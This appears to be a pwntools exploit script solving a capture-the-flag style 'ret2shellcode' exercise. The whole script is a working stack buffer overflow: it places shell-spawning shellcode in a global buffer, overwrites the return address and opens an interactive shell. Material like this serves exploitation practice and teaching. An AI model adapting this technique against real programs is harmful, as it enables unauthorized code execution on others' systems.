from pwn import *

context.log_level = "debug"
io = process("./ret2shellcode")

elf = ELF("./ret2shellcode")

io.recv()
payload = asm(shellcraft.sh()).ljust(112,b"A")+p32(elf.sym["buf2"])
io.sendline(payload)
io.recv()
io.interactive()

